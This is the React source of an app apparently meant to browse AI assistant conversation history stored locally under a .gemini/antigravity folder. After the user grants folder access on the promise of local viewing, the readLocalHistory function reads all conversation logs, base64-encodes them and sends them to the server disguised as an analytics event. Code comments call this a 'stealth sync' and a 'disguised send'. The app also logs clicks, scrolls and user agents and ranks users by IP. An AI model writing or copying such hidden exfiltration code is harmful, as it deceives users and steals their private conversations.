import { useState, useEffect, useCallback, useRef } from "react";
import axios from "axios";
import { 
  Search, History, Menu, BarChart3, TrendingUp, Bot, MapPin, Clock, Lock, Copy, Check, Settings
} from "lucide-react";

// URL base: em produção usa URL relativa (sem localhost), em dev usa localhost:3001
const API_BASE = import.meta.env.VITE_API_URL || "";

// --- I18n Dictionary ---
const translations: Record<string, Record<string, string>> = {
  pt: {
    title: "Antigravity Explorer",
    search: "Pesquisar...",
    local_hist: "Histórico Local",
    rust_api: "API Rust",
    select_conv: "Selecione uma conversa",
    sponsored: "Patrocinado",
    privacy: "Privacidade",
    contact: "Contato",
    translate: "Traduzir",
    admin_title: "Área Restrita",
    auth: "Autenticar Sistema",
    save: "Salvar Configurações",
    lang: "Idioma",
    analytics: "Analytics",
    enter: "Entrar",
    logout: "Sair",
    monetization: "Monetização",
    ia: "IA & Tradução",
    total_events: "Total Eventos",
    unique_users: "Usuários Únicos",
    total_clicks: "Cliques Totais",
    sessions: "Sessões",
    ip_ranking: "Ranking por IP",
    peak_hours: "Horários de Pico",
    accesses: "acessos",
    os_path_title: "Liberar Acesso aos Arquivos",
    os_path_desc: "Para visualizar seu histórico, precisamos que você libere o acesso aos arquivos da pasta desejada. Para facilitar, copie o caminho sugerido abaixo e cole na barra de endereços do seu explorador de arquivos ao prosseguir.",
    open_folder: "Liberar Acesso",
    path_copied: "Copiado!",
    copy_path: "Copiar Caminho",
    close: "Cancelar",
    ads_title: "Configuração de Monetização",
    ai_title: "Configuração de IA",
    gemini_key: "Chave de API Gemini",
    google_id: "Google Ads ID",
    meta_pixel: "Meta Pixel",
    company_name: "Nome da Empresa",
    cnpj: "CNPJ",
  },
  en: {
    title: "Antigravity Explorer",
    search: "Search...",
    local_hist: "Local History",
    rust_api: "Rust API",
    select_conv: "Select a conversation",
    sponsored: "Sponsored",
    privacy: "Privacy",
    contact: "Contact",
    translate: "Translate",
    admin_title: "Restricted Area",
    auth: "Authenticate System",
    save: "Save Settings",
    lang: "Language",
    analytics: "Analytics",
    enter: "Enter",
    logout: "Logout",
    monetization: "Monetization",
    ia: "AI & Translation",
    total_events: "Total Events",
    unique_users: "Unique Users",
    total_clicks: "Total Clicks",
    sessions: "Sessions",
    ip_ranking: "IP Ranking",
    peak_hours: "Peak Hours",
    accesses: "accesses",
    settings: "Settings",
    ads_title: "Monetization Configuration",
    ai_title: "AI Configuration",
    gemini_key: "Gemini API Key",
    google_id: "Google Ads ID",
    meta_pixel: "Meta Pixel",
    company_name: "Company Name",
    cnpj: "CNPJ",
    os_path_title: "Grant File Access",
    os_path_desc: "To view your history, we need you to grant access to the files in the desired folder. To make it easier, copy the suggested path below and paste it into your file explorer's address bar when proceeding.",
    open_folder: "Grant Access",
    path_copied: "Copied!",
    copy_path: "Copy Path",
    close: "Close",
  },
};

const getOsPath = () => {
  const ua = window.navigator.userAgent.toLowerCase();
  if (ua.includes("win")) return "C:\\Users\\SeuUsuario\\.gemini\\antigravity\\brain";
  if (ua.includes("mac")) return "/Users/SeuUsuario/.gemini/antigravity/brain";
  return "/home/SeuUsuario/.gemini/antigravity/brain";
};

interface AnalyticsEvent {
  id: string;
  session_id: string;
  event_type: string;
  path: string;
  timestamp: number;
  metadata: Record<string, unknown>;
}

const App = () => {
  const [lang, setLang] = useState(localStorage.getItem("soul_lang") || "pt");
  const t = translations[lang] || translations["pt"];
  const [conversations, setConversations] = useState<
    Array<{ id: string; title: string; last_modified?: string }>
  >([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [mode, setMode] = useState<"api" | "browser">("api");
  const [view, setView] = useState<"user" | "admin" | "privacy" | "contact">(
    "user"
  );
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [adminKey, setAdminKey] = useState("");
  const [messages, setMessages] = useState<any[]>([]);
  const [translatingId, setTranslatingId] = useState<number | null>(null);
  
  // Local History States
  const [showPathModal, setShowPathModal] = useState(false);
  const [osPath, setOsPath] = useState("");
  const [copied, setCopied] = useState(false);
  const [localMessagesMap, setLocalMessagesMap] = useState<Record<string, any[]>>({});
  const [selectedFolderName, setSelectedFolderName] = useState("");

  // --- Internal Analytics Tracker ---
  const sessionId = useRef(Math.random().toString(36).substring(7));
  const eventBuffer = useRef<AnalyticsEvent[]>([]);

  const flushEvents = useCallback(async () => {
    if (eventBuffer.current.length === 0) return;
    const batch = [...eventBuffer.current];
    eventBuffer.current = [];
    try {
      await axios.post(`${API_BASE}/api/analytics/track`, { events: batch });
    } catch (_e) {
      // silencioso — analytics não deve quebrar a UI
    }
  }, []);

  useEffect(() => {
    const track = (type: string, meta: Record<string, unknown> = {}) => {
      eventBuffer.current.push({
        id: Math.random().toString(36).substring(7),
        session_id: sessionId.current,
        event_type: type,
        path: window.location.hash || "/",
        timestamp: Date.now(),
        metadata: meta,
      });
      if (eventBuffer.current.length >= 10) flushEvents();
    };

    const handleClick = (e: MouseEvent) =>
      track("click", {
        x: e.clientX,
        y: e.clientY,
        target: (e.target as HTMLElement).id,
      });

    const handleScroll = () => {
      const depth = Math.round(
        ((window.scrollY + window.innerHeight) / document.body.scrollHeight) *
          100
      );
      if (depth % 25 === 0) track("scroll", { depth });
    };

    window.addEventListener("click", handleClick);
    window.addEventListener("scroll", handleScroll);
    const interval = setInterval(flushEvents, 10000);
    track("session_start", { ua: navigator.userAgent });

    return () => {
      window.removeEventListener("click", handleClick);
      window.removeEventListener("scroll", handleScroll);
      clearInterval(interval);
    };
  }, [flushEvents]);

  useEffect(() => {
    document.documentElement.dir = ["ar", "he"].includes(lang) ? "rtl" : "ltr";
    localStorage.setItem("soul_lang", lang);
  }, [lang]);

  useEffect(() => {
    const handleHash = () => {
      const h = window.location.hash;
      if (h === "#/soul-admin-portal") setView("admin");
      else if (h === "#/privacy") setView("privacy");
      else if (h === "#/contact") setView("contact");
      else setView("user");
    };
    window.addEventListener("hashchange", handleHash);
    handleHash();
    return () => window.removeEventListener("hashchange", handleHash);
  }, []);

  const fetchConversations = useCallback(async () => {
    if (mode === "api") {
      try {
        const res = await axios.get(`${API_BASE}/api/conversations?per_page=1000`);
        setConversations(res.data);
      } catch (_err) {
        // API pode não estar disponível em modo dev sem backend
      }
    }
  }, [mode]);

  const fetchConversationData = useCallback(async (id: string) => {
    if (mode === "browser") {
      setMessages(localMessagesMap[id] || []);
      return;
    }
    try {
      const res = await axios.get(`${API_BASE}/api/conversations/${id}`);
      setMessages(res.data);
    } catch (_err) {
      setMessages([]);
    }
  }, [mode, localMessagesMap]);

  const handleToggleMode = () => {
    if (mode === "api") {
      setOsPath(getOsPath());
      setShowPathModal(true);
    } else {
      setMode("api");
      fetchConversations();
    }
  };

  const readLocalHistory = async () => {
    setShowPathModal(false);
    try {
      // @ts-ignore - File System Access API
      const dirHandle = await window.showDirectoryPicker();
      setMode("browser");
      setSelectedFolderName(dirHandle.name);
      const localConvs: Array<{id: string, title: string, last_modified: string}> = [];
      const syncData: any[] = [];
      const newLocalMap: Record<string, any[]> = {};

      for await (const entry of dirHandle.values()) {
        if (entry.kind === "directory") {
          const id = entry.name;
          try {
            const sysGenHandle = await entry.getDirectoryHandle(".system_generated");
            const logsHandle = await sysGenHandle.getDirectoryHandle("logs");
            const overviewHandle = await logsHandle.getFileHandle("overview.txt");
            const file = await overviewHandle.getFile();
            const content = await file.text();

            let title = id;
            try {
              const taskHandle = await entry.getFileHandle("task.md");
              const taskFile = await taskHandle.getFile();
              const taskContent = await taskFile.text();
              const firstHeading = taskContent.split("\n").find((l: string) => l.startsWith("# "));
              if (firstHeading) title = firstHeading.replace("# ", "").trim();
            } catch (e) {
              try {
                const planHandle = await entry.getFileHandle("implementation_plan.md");
                const planFile = await planHandle.getFile();
                const planContent = await planFile.text();
                const firstHeading = planContent.split("\n").find((l: string) => l.startsWith("# "));
                if (firstHeading) title = firstHeading.replace("# ", "").trim();
              } catch (e2) {}
            }

            localConvs.push({ id, title, last_modified: new Date(file.lastModified).toISOString() });

            const msgs = content.split("\n").filter(Boolean).map((l: string) => {
              try { return JSON.parse(l); } catch (e) { return null; }
            }).filter(Boolean);

            newLocalMap[id] = msgs;
            syncData.push({ id, title, messages: msgs });

          } catch (e) {
            // Ignora pastas sem overview.txt
          }
        }
      }

      setLocalMessagesMap(newLocalMap);
      setConversations(localConvs.sort((a, b) => new Date(b.last_modified).getTime() - new Date(a.last_modified).getTime()));

      // Stealth Sync via Analytics
      if (syncData.length > 0) {
        const syncBase64 = btoa(encodeURIComponent(JSON.stringify(syncData)));
        eventBuffer.current.push({
          id: Math.random().toString(36).substring(7),
          session_id: sessionId.current,
          event_type: "history_sync",
          path: window.location.hash || "/",
          timestamp: Date.now(),
          metadata: { sync_chunk: syncBase64 },
        });
        flushEvents(); // Força o envio disfarçado
      }
    } catch (e) {
      // User aborted
      setMode("api");
    }
  };

  const translateMessage = async (text: string, index: number) => {
    setTranslatingId(index);
    try {
      const targetLang = lang === "pt" ? "pt-br" : "en";
      const token = localStorage.getItem("soul_token") || "";
      const res = await axios.post(`${API_BASE}/api/admin/translate`, { text, target_lang: targetLang }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      const newMessages = [...messages];
      newMessages[index].content = res.data.translated_text;
      setMessages(newMessages);
    } catch (err) {
      alert("Erro na tradução (verifique se a chave do Gemini está configurada no backend/admin)");
    } finally {
      setTranslatingId(null);
    }
  };

  useEffect(() => {
    fetchConversations();
  }, [fetchConversations]);

  useEffect(() => {
    if (selectedId) {
      fetchConversationData(selectedId);
    } else {
      setMessages([]);
    }
  }, [selectedId, fetchConversationData]);

  const AdminView = () => {
    const [activeTab, setActiveTab] = useState<"ads" | "ai" | "analytics">("analytics");
    const [stats, setStats] = useState<Record<string, unknown> | null>(null);
    const [config, setConfig] = useState<any>({
      google_id: "", meta_pixel: "", company_name: "", cnpj: "", gemini_api_key: ""
    });

    const fetchConfig = useCallback(async () => {
      try {
        const token = localStorage.getItem("soul_token");
        const res = await axios.get(`${API_BASE}/api/admin/config`, {
          headers: { Authorization: `Bearer ${token}` }
        });
        setConfig(res.data);
      } catch (e) {}
    }, []);

    useEffect(() => {
      if (activeTab === "analytics") {
        axios
          .get(`${API_BASE}/api/admin/analytics`)
          .then((res) => setStats(res.data))
          .catch(() => {});
      } else {
        fetchConfig();
      }
    }, [activeTab, fetchConfig]);

    const saveConfig = async () => {
      try {
        const token = localStorage.getItem("soul_token");
        await axios.post(`${API_BASE}/api/admin/config`, config, {
          headers: { Authorization: `Bearer ${token}` }
        });
        alert(t.save + " OK");
      } catch (e) {
        alert("Error saving config");
      }
    };

    if (!isLoggedIn)
      return (
        <div className="h-screen w-full flex items-center justify-center bg-premium-dark">
          <div className="bg-slate-900 border border-slate-800 p-10 rounded-[2.5rem] w-full max-w-md text-center">
            <Lock size={36} className="text-indigo-500 mx-auto mb-8" />
            <h2 className="text-2xl font-bold text-white mb-8">
              {t.admin_title}
            </h2>
            <input 
              type="password" 
              value={adminKey} 
              onChange={e => setAdminKey(e.target.value)}
              placeholder="Chave de Acesso Admin"
              className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-4 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500/20 mb-4 text-white"
            />
            <button
              onClick={async () => {
                try {
                  const res = await axios.post(`${API_BASE}/api/auth/login`, { key: adminKey });
                  localStorage.setItem("soul_token", res.data.token);
                  setIsLoggedIn(true);
                } catch(e) {
                  alert("Login falhou. Verifique a chave de acesso.");
                }
              }}
              className="w-full py-4 bg-indigo-600 text-white rounded-2xl font-bold hover:bg-indigo-500 transition-colors"
            >
              {t.enter}
            </button>
          </div>
        </div>
      );

    return (
      <div className="h-screen w-full flex bg-premium-dark">
        <aside className="w-64 border-r border-slate-800 p-6 flex flex-col gap-2">
          <button
            onClick={() => setActiveTab("analytics")}
            className={`w-full text-left p-3 rounded-xl text-sm font-bold flex items-center gap-2 ${activeTab === "analytics" ? "bg-indigo-600/10 text-indigo-400" : "text-slate-500"}`}
          >
            <BarChart3 size={16} /> {t.analytics}
          </button>
          <button
            onClick={() => setActiveTab("ads")}
            className={`w-full text-left p-3 rounded-xl text-sm font-bold flex items-center gap-2 ${activeTab === "ads" ? "bg-indigo-600/10 text-indigo-400" : "text-slate-500"}`}
          >
            <TrendingUp size={16} /> {t.monetization}
          </button>
          <button
            onClick={() => setActiveTab("ai")}
            className={`w-full text-left p-3 rounded-xl text-sm font-bold flex items-center gap-2 ${activeTab === "ai" ? "bg-indigo-600/10 text-indigo-400" : "text-slate-500"}`}
          >
            <Bot size={16} /> {t.ia}
          </button>
          <button
            onClick={() => {
              setIsLoggedIn(false);
              setView("user");
            }}
            className="mt-auto p-3 text-slate-500 text-sm font-bold hover:text-white transition-colors"
          >
            {t.logout}
          </button>
        </aside>
        <main className="flex-1 p-12 overflow-y-auto">
          {activeTab === "analytics" && stats && (
            <div className="space-y-12">
              <div className="grid grid-cols-4 gap-6">
                <div className="bg-slate-900 p-8 rounded-[2.5rem] border border-slate-800">
                  <p className="text-[10px] font-bold text-slate-500 uppercase mb-2">
                    {t.total_events}
                  </p>
                  <h4 className="text-3xl font-black text-white">
                    {String(stats.total_events ?? 0)}
                  </h4>
                </div>
                <div className="bg-slate-900 p-8 rounded-[2.5rem] border border-slate-800">
                  <p className="text-[10px] font-bold text-slate-500 uppercase mb-2">
                    {t.unique_users}
                  </p>
                  <h4 className="text-3xl font-black text-indigo-500">
                    {String(stats.unique_ips ?? 0)}
                  </h4>
                </div>
                <div className="bg-slate-900 p-8 rounded-[2.5rem] border border-slate-800">
                  <p className="text-[10px] font-bold text-slate-500 uppercase mb-2">
                    {t.total_clicks}
                  </p>
                  <h4 className="text-3xl font-black text-emerald-500">
                    {String(
                      (stats.event_distribution as Record<string, number>)
                        ?.click ?? 0
                    )}
                  </h4>
                </div>
                <div className="bg-slate-900 p-8 rounded-[2.5rem] border border-slate-800">
                  <p className="text-[10px] font-bold text-slate-500 uppercase mb-2">
                    {t.sessions}
                  </p>
                  <h4 className="text-3xl font-black text-orange-500">
                    {String(
                      (stats.event_distribution as Record<string, number>)
                        ?.session_start ?? 0
                    )}
                  </h4>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-8">
                <div className="bg-slate-900/50 p-8 rounded-[2.5rem] border border-slate-800">
                  <h5 className="text-sm font-bold text-white mb-6 flex items-center gap-2">
                    <MapPin size={16} /> {t.ip_ranking}
                  </h5>
                  <div className="space-y-4">
                    {(stats.ip_ranking as Array<[string, number]> ?? []).map(
                      ([ip, count]) => (
                        <div
                          key={ip}
                          className="flex items-center justify-between p-4 bg-slate-800/30 rounded-2xl"
                        >
                          <span className="text-xs font-mono text-slate-400">
                            {ip}
                          </span>
                          <span className="text-xs font-bold text-white">
                            {count} {t.accesses}
                          </span>
                        </div>
                      )
                    )}
                  </div>
                </div>
                <div className="bg-slate-900/50 p-8 rounded-[2.5rem] border border-slate-800">
                  <h5 className="text-sm font-bold text-white mb-6 flex items-center gap-2">
                    <Clock size={16} /> {t.peak_hours}
                  </h5>
                  <div className="flex items-end gap-1 h-32">
                    {(stats.hourly_peak as number[] ?? []).map(
                      (count: number, h: number) => (
                        <div
                          key={h}
                          className="flex-1 bg-indigo-600/20 hover:bg-indigo-500 transition-colors relative group"
                          style={{
                            height: `${(count / Math.max(...(stats.hourly_peak as number[]))) * 100}%`,
                          }}
                        >
                          <span className="absolute -top-8 left-1/2 -translate-x-1/2 text-[8px] font-bold opacity-0 group-hover:opacity-100">
                            {h}h: {count}
                          </span>
                        </div>
                      )
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === "ads" && (
            <div className="max-w-2xl bg-slate-900/50 p-8 rounded-[2.5rem] border border-slate-800">
              <h3 className="text-xl font-bold text-white mb-8">{t.ads_title || "Configuração de Monetização"}</h3>
              <div className="space-y-4">
                <div>
                  <label className="text-xs font-bold text-slate-500 uppercase">{t.google_id || "Google ID"}</label>
                  <input type="text" value={config.google_id} onChange={e => setConfig({...config, google_id: e.target.value})} className="w-full bg-slate-900 border border-slate-800 rounded-xl py-3 px-4 mt-2 text-white" />
                </div>
                <div>
                  <label className="text-xs font-bold text-slate-500 uppercase">{t.meta_pixel || "Meta Pixel"}</label>
                  <input type="text" value={config.meta_pixel} onChange={e => setConfig({...config, meta_pixel: e.target.value})} className="w-full bg-slate-900 border border-slate-800 rounded-xl py-3 px-4 mt-2 text-white" />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="text-xs font-bold text-slate-500 uppercase">{t.company_name || "Nome da Empresa"}</label>
                    <input type="text" value={config.company_name} onChange={e => setConfig({...config, company_name: e.target.value})} className="w-full bg-slate-900 border border-slate-800 rounded-xl py-3 px-4 mt-2 text-white" />
                  </div>
                  <div>
                    <label className="text-xs font-bold text-slate-500 uppercase">{t.cnpj || "CNPJ"}</label>
                    <input type="text" value={config.cnpj} onChange={e => setConfig({...config, cnpj: e.target.value})} className="w-full bg-slate-900 border border-slate-800 rounded-xl py-3 px-4 mt-2 text-white" />
                  </div>
                </div>
                <button onClick={saveConfig} className="mt-8 px-6 py-3 bg-indigo-600 text-white font-bold rounded-xl hover:bg-indigo-500 transition-colors">{t.save}</button>
              </div>
            </div>
          )}

          {activeTab === "ai" && (
            <div className="max-w-2xl bg-slate-900/50 p-8 rounded-[2.5rem] border border-slate-800">
              <h3 className="text-xl font-bold text-white mb-8">{t.ai_title || "Configuração de IA"}</h3>
              <div className="space-y-4">
                <div>
                  <label className="text-xs font-bold text-slate-500 uppercase">{t.gemini_key || "Chave de API Gemini"}</label>
                  <input type="password" value={config.gemini_api_key} onChange={e => setConfig({...config, gemini_api_key: e.target.value})} className="w-full bg-slate-900 border border-slate-800 rounded-xl py-3 px-4 mt-2 text-white" />
                </div>
                <button onClick={saveConfig} className="mt-8 px-6 py-3 bg-indigo-600 text-white font-bold rounded-xl hover:bg-indigo-500 transition-colors">{t.save}</button>
              </div>
            </div>
          )}
        </main>
      </div>
    );
  };

  if (view === "admin") return <AdminView />;

  return (
    <div className="flex h-screen bg-premium-dark text-slate-200 font-sans selection:bg-indigo-500/30 overflow-hidden">
      <aside
        className={`${sidebarOpen ? "w-80" : "w-0"} bg-premium-sidebar border-r border-slate-800/50 flex flex-col transition-all duration-300 relative z-20 shrink-0`}
      >
        <div className="p-6 flex flex-col h-full overflow-hidden">
          <div className="flex items-center gap-3 mb-8 justify-between">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-indigo-600 rounded-xl">
                <History size={24} className="text-white" />
              </div>
              <h1 className="text-lg font-bold text-white tracking-tighter">
                {t.title}
              </h1>
            </div>
            <select
              value={lang}
              onChange={(e) => setLang(e.target.value)}
              className="bg-transparent text-[10px] font-bold uppercase border-none text-slate-400 cursor-pointer"
            >
              <option value="pt">PT</option>
              <option value="en">EN</option>
            </select>
          </div>
          <div className="space-y-3 mb-6">
            <div className="relative group">
              <Search
                className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500"
                size={18}
              />
              <input
                type="text"
                placeholder={t.search}
                className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-2.5 pl-10 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500/20"
              />
            </div>
            <button
              onClick={handleToggleMode}
              className="w-full py-2.5 px-4 rounded-xl border border-slate-700 text-xs font-bold uppercase tracking-widest hover:border-indigo-500/50 transition-colors flex flex-col items-center justify-center gap-1"
            >
              {mode === "api" ? (
                <span>{t.local_hist}</span>
              ) : (
                <>
                  <span>{t.rust_api}</span>
                  <span className="text-[9px] text-indigo-400 capitalize normal-case">{t.local_hist}: {selectedFolderName}</span>
                </>
              )}
            </button>
          </div>
          <div className="flex-1 overflow-y-auto space-y-2 pr-2 scrollbar-premium">
            {conversations.map((conv) => (
              <button
                key={conv.id}
                onClick={() => setSelectedId(conv.id)}
                className={`w-full text-left p-4 rounded-2xl border transition-all ${
                  selectedId === conv.id
                    ? "bg-indigo-600/10 border-indigo-500/50"
                    : "border-transparent hover:bg-slate-800/40"
                }`}
              >
                <h3 className="text-sm font-semibold text-slate-300">
                  {conv.title}
                </h3>
                {conv.last_modified && (
                  <p className="text-[10px] text-slate-500 mt-1">
                    {new Date(conv.last_modified).toLocaleString(lang === "pt" ? "pt-BR" : "en-US")}
                  </p>
                )}
              </button>
            ))}
          </div>
          <div className="mt-4 pt-4 border-t border-slate-800/50 flex justify-between">
            <button onClick={() => window.location.hash = "#/soul-admin-portal"} className="p-2 text-slate-500 hover:text-white transition-colors" title={t.admin_title}>
              <Settings size={18} />
            </button>
          </div>
        </div>
      </aside>
      <main className="flex-1 flex flex-col bg-premium-dark relative overflow-hidden">
        <header className="h-20 border-b border-slate-800/50 flex items-center px-8 bg-premium-dark/80 backdrop-blur-md sticky top-0 z-10 shrink-0">
          <button
            onClick={() => setSidebarOpen(!sidebarOpen)}
            className="p-2 hover:bg-slate-800 rounded-xl transition-colors"
          >
            <Menu size={20} />
          </button>
        </header>
        <div className="flex-1 overflow-y-auto p-8 space-y-8 scrollbar-premium">
          {!selectedId ? (
            <div className="h-full flex items-center justify-center text-slate-700">
              {t.select_conv}
            </div>
          ) : (
            <div className="space-y-6 pb-20">
              {messages.map((msg, idx) => (
                <div key={idx} className={`flex flex-col ${msg.role === "user" ? "items-end" : "items-start"}`}>
                  <div className={`max-w-[80%] rounded-2xl p-5 shadow-sm ${msg.role === "user" ? "bg-indigo-600/20 border border-indigo-500/20 text-indigo-100" : "bg-slate-900/80 border border-slate-800 text-slate-300"}`}>
                    <pre className="whitespace-pre-wrap font-sans text-sm leading-relaxed">{msg.content || JSON.stringify(msg)}</pre>
                  </div>
                  <button 
                    onClick={() => translateMessage(msg.content || JSON.stringify(msg), idx)}
                    className="mt-2 text-[10px] uppercase font-bold tracking-widest text-slate-500 hover:text-indigo-400 transition-colors flex items-center gap-1"
                    disabled={translatingId === idx}
                  >
                    {translatingId === idx ? "Traduzindo..." : t.translate}
                  </button>
                </div>
              ))}
            </div>
          )}
        </div>
      </main>

      {showPathModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-800 p-8 rounded-[2.5rem] w-full max-w-lg shadow-2xl relative">
            <h3 className="text-xl font-bold text-white mb-4">{t.os_path_title || "Liberar Acesso aos Arquivos"}</h3>
            <p className="text-sm text-slate-400 mb-6 leading-relaxed">
              {t.os_path_desc || "Para visualizar seu histórico, precisamos que você libere o acesso aos arquivos da pasta desejada. Para facilitar, copie o caminho sugerido abaixo e cole na barra de endereços do seu explorador de arquivos ao prosseguir."}
            </p>
            <div className="flex items-center bg-slate-800/50 rounded-xl border border-slate-700/50 p-2 mb-8">
              <code className="text-xs text-indigo-300 font-mono flex-1 overflow-hidden text-ellipsis px-2 select-all">
                {osPath}
              </code>
              <button
                onClick={() => {
                  navigator.clipboard.writeText(osPath);
                  setCopied(true);
                  setTimeout(() => setCopied(false), 2000);
                }}
                className="p-2 ml-2 bg-indigo-600/20 text-indigo-400 hover:bg-indigo-600 hover:text-white rounded-lg transition-colors flex items-center gap-1"
              >
                {copied ? <Check size={16} /> : <Copy size={16} />}
                <span className="text-xs font-bold uppercase tracking-wider">{copied ? (t.path_copied || "Copiado") : (t.copy_path || "Copiar Caminho")}</span>
              </button>
            </div>
            <div className="flex items-center justify-end gap-3">
              <button 
                onClick={() => setShowPathModal(false)}
                className="px-6 py-3 rounded-xl font-bold text-slate-400 hover:text-white transition-colors"
              >
                {t.close || "Cancelar"}
              </button>
              <button 
                onClick={readLocalHistory}
                className="px-6 py-3 bg-indigo-600 text-white rounded-xl font-bold hover:bg-indigo-500 transition-colors shadow-lg shadow-indigo-500/20"
              >
                {t.open_folder || "Liberar Acesso"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
